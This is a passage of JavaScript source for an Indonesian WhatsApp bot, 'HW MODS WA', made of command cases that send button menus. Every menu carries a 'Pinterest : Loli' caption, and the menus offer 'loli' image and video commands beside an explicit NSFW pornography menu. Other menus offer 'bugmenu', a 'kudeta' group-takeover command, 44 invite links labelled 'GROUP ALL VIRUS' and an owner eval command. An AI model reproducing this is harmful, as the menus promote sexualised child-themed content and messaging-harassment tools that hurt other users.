Haikal.relayWAMessage(res)
break
break
case 'menusound':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
				"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▢🔥➥ ${prefix}apa
▢🔥➥ ${prefix}loli
▢🔥➥ ${prefix}asw
▢🔥➥ ${prefix}opo
▢🔥➥ ${prefix}awkwk
▢🔥➥ ${prefix}kasian
▢🔥➥ ${prefix}kesel
▢🔥➥ ${prefix}ngeselin
▢🔥➥ ${prefix}keren
▢🔥➥ ${prefix}ketawa
▢🔥➥ ${prefix}hoax
▢🔥➥ ${prefix}bot
▢🔥➥ ${prefix}ikal
▢🔥➥ ${prefix}bacot

▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `SCBOT`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break	
// LIST INTRO ( HW MODS WA )
case 'groupbot':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"locationMessage": {
						"degreesLatitude": -6.105394271969506,
						"degreesLongitude": 106.71700716018677
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
- INFO WHATSAPP HW MODS + BOT -
1. https://chat.whatsapp.com/IrDkkJGl2kn4vdJ2MWVVnt
2. https://chat.whatsapp.com/BfUhDS1wFuX62u9PeIOmdU

- INFO GROUP ALL VIRUS -

1. https://chat.whatsapp.com/GdbrLkRPZZq1RGSJrwRaj3
2. https://chat.whatsapp.com/EkUE7crS7ri7HFI5KFDOrh
3. https://chat.whatsapp.com/Fi4OvSr3RWTKS14HTthhQf
4. https://chat.whatsapp.com/GpGL3iieIWQB4OuhukQnuP
5. https://chat.whatsapp.com/HCZGPmB6yGh3a2Q7oOO5QT
6. https://chat.whatsapp.com/JNB42nhXvp4Dl4KKNw7x67
7. https://chat.whatsapp.com/CGgu2lChdK2LUPFLKhNrbC
8. https://chat.whatsapp.com/FsNnmTnl3gQ5p3ZnUMreFI
9. https://chat.whatsapp.com/CIFrfBJKiAS3g1zdPTUqYz
10. https://chat.whatsapp.com/IzeHF2PL4p3Auw9bcuMjmi
11. https://chat.whatsapp.com/EO2s0KL2DD2HcE75dQoe9f
12. https://chat.whatsapp.com/ENq7tp7GD9B7r4Sb0WEL5M
13. https://chat.whatsapp.com/BplIrSIakzb3PEojBK1lXg
14. https://chat.whatsapp.com/JQ6kJyW99L1BorQGsgpdyq
15. https://chat.whatsapp.com/JdcKjcv6dHP0Mg567uB9mo
16. https://chat.whatsapp.com/ByQz3wdiZwSKj8Gxu21aB5
17. https://chat.whatsapp.com/D7oNzDs4vsx0KfqYCoGKap
18. https://chat.whatsapp.com/KyQ3p8Eokv01IAzWHRFnJL
19. https://chat.whatsapp.com/HribVoY5sjU8YrqxZzzch6
20. https://chat.whatsapp.com/Hmks7s3MZLn5j5RiToClbo
21. https://chat.whatsapp.com/C6vnKGJQESTE2uTRcYi14C
22. https://chat.whatsapp.com/KairIwHsbJX0NZJyTPTNOU
23. https://chat.whatsapp.com/Dodbi0a9Rp2CV2VcSohrVH
24. https://chat.whatsapp.com/DnCO15NQu3TJVQBCn2iWEo
25. https://chat.whatsapp.com/JuzTiLV3WBUB9hPkjibG4r
26. https://chat.whatsapp.com/EypmOBm22FfJYHVodYQaom
27. https://chat.whatsapp.com/DQ614n3XGbCFHfZyb0QgCq
28. https://chat.whatsapp.com/F8g44snbkdhAnvd64wFGO6
29. https://chat.whatsapp.com/K2QZa966a100iaiw4xvC21
30. https://chat.whatsapp.com/E9I0gHmii1CAi3lT2MaVQx
31. https://chat.whatsapp.com/HnXQw7R1S168jketzHsUOR
32. https://chat.whatsapp.com/Bxw7gUegm4w5mrrsI7bOP6
33. https://chat.whatsapp.com/G5Vd5ZeJeGO2XHfD5Efenm
34. https://chat.whatsapp.com/KzCSiFbxIqY57HkKG4Ugsy
35. https://chat.whatsapp.com/JQUaFXT5qTi8FpeAvT3zuo
36. https://chat.whatsapp.com/IadgagK7y867n2sr5aX7pz
37. https://chat.whatsapp.com/EthZPeprbd5HfLyXUTMnl9
38. https://chat.whatsapp.com/BHKHkVfyAJ57C4vZrjIxAJ
39. https://chat.whatsapp.com/HxX9Xkv2SdtBgNZNKxd5G0
40. https://chat.whatsapp.com/CDnZ14fUjc88crWGMoYSLC
41. https://chat.whatsapp.com/IrnsezqUUdIILJMqRHXNZ0
42. https://chat.whatsapp.com/KPc1A0l9LKgBaGSonz7h7w
43. https://chat.whatsapp.com/FvDpvV9EuKGGnrIVDvMS4H
44. https://chat.whatsapp.com/LWdOZwI4Ncq2sRcntn1r4A
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - DONASI BOT -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
- DONASI -
DANA : 6285714170944
SAWERIA : https://saweria.co/hwmodswa
PULSA : wa.me/6285714170944

- THANKS YOU BOT -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "LOCATION"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
case 'intro':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
┏━━⊱
┣❏NAMA :   
┣❏UMUR :  
┣❏KOTA : 
┣❏NEGARA :
┣❏ALASAN BERGABUNG :
┣❏PASANGAN :
┗━━⊱
┏━━⊱
┣❏🔥➥ WELCOME BOT
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - DONASI BOT -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
- DONASI -
DANA : 6285714170944
SAWERIA : https://saweria.co/hwmodswa
PULSA : wa.me/6285714170944

- THANKS YOU BOT -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
// List Menu
case 'menu':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭

- COMMAND MENU -
┏━━⊱
┣❏🔥➥ HACKTAE <kudeta>
┣❏🔥➥ Musikkal
┣❏🔥➥ Menu
┣❏🔥➥ ${prefix}asupanboy
┣❏🔥➥ ${prefix}quotes
┣❏🔥➥ ${prefix}owner
┣❏🔥➥ ${prefix}makermenu
┣❏🔥➥ ${prefix}makerkal
┣❏🔥➥ ${prefix}lolivideo
┣❏🔥➥ ${prefix}menunsfw
┣❏🔥➥ ${prefix}bugmenu
┣❏🔥➥ ${prefix}groupbot
┣❏🔥➥ ${prefix}menusound
┣❏🔥➥ ${prefix}intro
┣❏🔥➥ ${prefix}me
┣❏🔥➥ ${prefix}kemiripan
┣❏🔥➥ ${prefix}hwmenu
┣❏🔥➥ ${prefix}modsmenu
┣❏🔥➥ ${prefix}kodekeras
┣❏🔥➥ ${prefix}mausange
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
┏━━⊱
┣❏🔥➥ ALL MENU ONLY BUTTON
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `SCBOT`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `OWNER`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - DONASI BOT -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
- DONASI -
DANA : 6285714170944
SAWERIA : https://saweria.co/hwmodswa
PULSA : wa.me/6285714170944

- THANKS YOU BOT -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
case 'asupanboy':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭

AWW :V
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - DONASI BOT -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
- DONASI -
DANA : 6285714170944
SAWERIA : https://saweria.co/hwmodswa
PULSA : wa.me/6285714170944

- THANKS YOU BOT -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `ASUPAN`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `ASUPAN2`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
case 'LOLIVIDEO':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
						"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
RANDOM LOLI 🗿
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `SCBOT`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `Lolivideo`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `Lanjut`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
case 'menunsfw':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
							"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": ` NSFW
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▬▭▬▭▬▭▬▭▬▬▭▬▭
│◦➛${prefix}trapnime
│◦➛${prefix}neko
│◦➛${prefix}megumin
│◦➛${prefix}blowjob
│◦➛${prefix}hentai
│◦➛${prefix}awoo
│◦➛${prefix}bj 
│◦➛${prefix}eroneko
│◦➛${prefix}lesbian
│◦➛${prefix}anal
│◦➛${prefix}yuri
│◦➛${prefix}baka
│◦➛${prefix}neko2
│◦➛${prefix}wallpaper
│◦➛${prefix}pussy
│◦➛${prefix}kitsune
│◦➛${prefix}keta
│◦➛${prefix}neko2
│◦➛${prefix}poke
│◦➛${prefix}slap
│◦➛${prefix}komiku [ query ]
│◦➛${prefix}otaku [ query ]
│◦➛${prefix}chara [ query ]

NOTE :🔥➥ ${prefix}nsfw [ 1/0 ]
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `SCBOT`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
//LIST MODS MENU
case 'modsmenu':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
							"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU MODS -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
┏━━⊱ 
═════{*SETTINGS MENU*}═════
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}setthumb <reply>
┣❏🔥➥ ${prefix}settarget <62xxxx>
┣❏🔥➥ ${prefix}setfakeimg <reply>
┣❏🔥➥ ${prefix}setreply <query>
┣❏🔥➥ ${prefix}setname <query>
┣❏🔥➥ ${prefix}setnamepp <query>
┣❏🔥➥ ${prefix}setdesc <query>
┣❏🔥➥ ${prefix}emoji <emoji>
┣❏🔥➥ ${prefix}tts id <reply>
┣❏🔥➥ ${prefix}setprefix <query>
┣❏🔥➥ ${prefix}setlink <query>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU HW -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭

┏━━⊱
═════{*GROUP MENU*}═════
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}antilink <1/0>
┣❏🔥➥ ${prefix}groupinfo [Info]
┣❏🔥➥ ${prefix}revoke [Revoke]
┣❏🔥➥ ${prefix}linkgc [Link Group]
┣❏🔥➥ ${prefix}group <open/close>
┣❏🔥➥ ${prefix}add <62xxxx>
┣❏🔥➥ ${prefix}kick <tag>
┣❏🔥➥ ${prefix}sider <reply>
┣❏🔥➥ ${prefix}getbio <reply>
┣❏🔥➥ ${prefix}bc <query>
┣❏🔥➥ ${prefix}setbio <quey>
┣❏🔥➥ ${prefix}promote <reply>
┣❏🔥➥ ${prefix}demote <reply>
┣❏🔥➥ ${prefix}demoteall
┣❏🔥➥ ${prefix}getname <reply>
┣❏🔥➥ ${prefix}promoteall
┣❏🔥➥ ${prefix}getpic <query>
┣❏🔥➥ ${prefix}getp [From]
┣❏🔥➥ ${prefix}get <link>
┣❏🔥➥ ${prefix}q [Copy Paste]
┣❏🔥➥ ${prefix}listadmin <link>
┣❏🔥➥ ${prefix}inspect <link>
┣❏🔥➥ ${prefix}searchtext <query>
┣❏🔥➥ ${prefix}searchgc <query>
┣❏🔥➥ ${prefix}penjara <nama group>
┗━━⊱
┏━━⊱
═════{*GAME MENU*}═════
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}tictactoe <@tag>
┣❏🔥➥ ${prefix}cekhistory [Status]
┣❏🔥➥ ${prefix}delsesi <game>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU WA -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
═════{*COMMAND*}═════
┏━━⊱
┣❏🔥➥ => [eval async]
┣❏🔥➥ > [eval]
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
case 'kemiripan':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
							"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!

TESTING KEMIRIPAN MUKA ANDA :v
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `GANTENG`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `CANTIK`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": `KEREN`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
//List Hw Menu
case 'hwmenu':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
							"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU MODS -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
═════{*OWNER*}═════
┏━━⊱
├ ❏🔥➥ ${prefix}leave <id>
├ ❏🔥➥ ${prefix}self [Self]
├ ❏🔥➥ ${prefix}public [Public]
├ ❏🔥➥ ${prefix}off <query>
├ ❏🔥➥ ${prefix}intro [intro]
├ ❏🔥➥ ${prefix}on [Online]
├ ❏🔥➥ ${prefix}ban <target>
├ ❏🔥➥ ${prefix}status [Status]
├ ❏🔥➥ ${prefix}antibug <on/off>
├ ❏🔥➥ ${prefix}antitag <on/off>
├ ❏🔥➥ ${prefix}autoread <query>
├ ❏🔥➥ ${prefix}anticall <on/off>
├ ❏🔥➥ ${prefix}antidelete <on/off>
├ ❏🔥➥ ${prefix}join <link>
├ ❏🔥➥ ${prefix}restart [Restart]
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU HW -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
